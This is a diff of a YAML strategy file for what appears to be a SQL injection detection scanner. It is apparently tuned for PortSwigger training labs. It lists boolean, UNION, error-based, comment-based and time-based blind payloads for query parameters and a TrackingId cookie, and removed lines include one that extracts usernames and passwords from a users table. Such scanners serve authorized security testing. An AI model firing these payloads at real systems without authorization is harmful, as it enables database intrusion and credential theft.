@@ -1,6 +1,7 @@
 strategies:
-  - name: basic_hidden_data
-    description: Detects boolean-based GET SQLi by comparing response size.
+  # ============ PORTSWIGGER-OPTIMIZED BOOLEAN-BASED ============
+  - name: boolean_basic_hidden_data
+    description: PortSwigger basic hidden data detection
     target: query
     detection:
       type: length_delta
@@ -8,38 +9,100 @@ strategies:
     payloads:
       - "' OR '1'='1"
       - "' OR 1=1--"
+      - "' OR 'x'='x"
+      - "1' OR '1'='1"
+      - "admin' OR '1'='1"
 
-  - name: tracking_cookie_error
-    description: Oracle-style conditional errors via TrackingId cookie.
-    target: cookie
-    cookie_name: TrackingId
+  - name: boolean_and_injection
+    description: AND-based boolean injection
+    target: query
     detection:
-      type: status_code
-      status: 500
+      type: length_delta
+      min_delta: 100
     payloads:
-      - "'||(SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE NULL END FROM dual)||'"
-      - "'||(SELECT username||password FROM users WHERE rownum=1)||'"
-
-  - name: tracking_cookie_welcome
-    description: Blind response-based injection via TrackingId cookie.
-    target: cookie
-    cookie_name: TrackingId
-    detection:
-      type: keyword_presence
-      keyword: "Welcome back!"
-    payloads:
+      - "' AND '1'='1"
       - "' AND 1=1--"
+      - "1' AND 1=1--"
+      - "') AND ('1'='1"
+
+  # ============ UNION-BASED FOR PORTSWIGGER ============
+  - name: union_simple
+    description: Simple UNION SELECT injection
+    target: query
+    detection:
+      type: length_delta
+      min_delta: 200
+    payloads:
+      - "' UNION SELECT NULL--"
+      - "' UNION SELECT 'a'--"
+      - "' UNION SELECT 1--"
+      - "' UNION SELECT 1,2--"
+      - "' UNION SELECT 1,2,3--"
+      - "' UNION SELECT 1,2,3,4--"
+
+  # ============ ERROR-BASED DETECTION ============
+  - name: error_based_basic
+    description: Basic error-based injection
+    target: query
+    detection:
+      type: error_detection
+    payloads:
+      - "' AND 1=CAST(1 AS INT)--"
+      - "' AND extractvalue(0,version())--"
+      - "' AND updatexml(0,version(),0)--"
+
+  # ============ COMMENT-BASED ============
+  - name: comment_injection
+    description: Comment-based SQL injection
+    target: query
+    detection:
+      type: length_delta
+      min_delta: 300
+    payloads:
+      - "' --"
+      - "' #"
+      - "' /*"
+      - "admin' --"
+      - "' OR 1=1 --"
+
+  # ============ TIME-BASED BLIND ============
+  - name: time_based_simple
+    description: Time-based blind SQL injection
+    target: query
+    detection:
+      type: time_delay
+      threshold: 3
+    payloads:
+      - "' AND SLEEP(3)--"
+      - "' OR SLEEP(3)--"
+      - "1' AND SLEEP(3)--"
+      - "' AND pg_sleep(3)--"
+
+  # ============ PORTSWIGGER COOKIE LABS ============
+  - name: tracking_cookie_boolean
+    description: TrackingId cookie boolean-based SQLi
+    target: cookie
+    cookie_name: TrackingId
+    detection:
+      type: length_delta
+      min_delta: 100
+    payloads:
+      - "' OR '1'='1"
+      - "' AND '1'='1"
+      - "' OR 1=1--"
       - "' AND (SELECT 'x' FROM users LIMIT 1)='x'--"
-      - "' AND (SELECT username FROM users WHERE username='administrator')='administrator'--"
 
   - name: tracking_cookie_time_delay
-    description: Time-delay payloads to confirm blind SQLi.
+    description: TrackingId time-based blind injection
     target: cookie
     cookie_name: TrackingId
     detection:
       type: time_delay
-      threshold: 5
+      threshold: 3
     payloads:
-      - "'||(SELECT pg_sleep(5))||'"
+      - "' AND SLEEP(3)--"
+      - "' || (SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE NULL END)||'"
+      - "' AND pg_sleep(3)--"
+
 
 
